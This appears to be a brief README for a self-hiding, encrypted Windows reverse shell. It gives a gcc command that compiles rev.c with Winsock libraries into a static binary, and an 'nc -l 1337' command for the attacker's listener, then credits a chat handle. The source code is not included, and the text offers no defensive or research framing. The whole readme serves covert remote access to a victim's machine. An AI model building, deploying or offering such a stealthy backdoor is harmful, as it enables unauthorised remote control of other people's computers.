# A very simple encrypted windows reverse shell that also hides itself

# Usage (Client Side)
```
gcc rev.c -lwsock32 -lws2_32 -static-libgcc -o rev
``` 
# Usage (Server Side)

```
nc -l 1337
```
**Any listener should do**

# Credits: vinniekorkor#7391

